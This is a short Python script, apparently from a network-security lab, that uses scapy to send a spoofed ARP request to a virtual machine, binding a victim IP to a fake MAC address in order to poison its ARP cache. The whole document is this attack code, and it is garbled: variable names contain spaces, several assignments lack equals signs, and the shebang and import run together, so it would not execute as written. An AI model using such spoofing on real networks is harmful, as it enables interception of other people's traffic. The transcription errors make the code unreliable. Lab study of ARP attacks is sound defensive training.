#!/usr/bin/python3 from scapy.all import *
VM A IP = "10.0.2.6"
VM A MAC "08:00:27:84:5e:b9"
VICTIM IP = "10.0.2.99"
FAKE MAC = "aa:bb:cc:dd:ee:ff"
print("SENDING SPOOFED ARP REQUEST......")
ether Ether()
ether.dst = VM A MAC
ether.src = FAKE MAC
arp = ARP()
arp.psrc = VICTIM IP
arp.hwsrc FAKE MAC
arp.pdst = VM A IP
arp.op 1
frame ether/arp
sendp (frame)
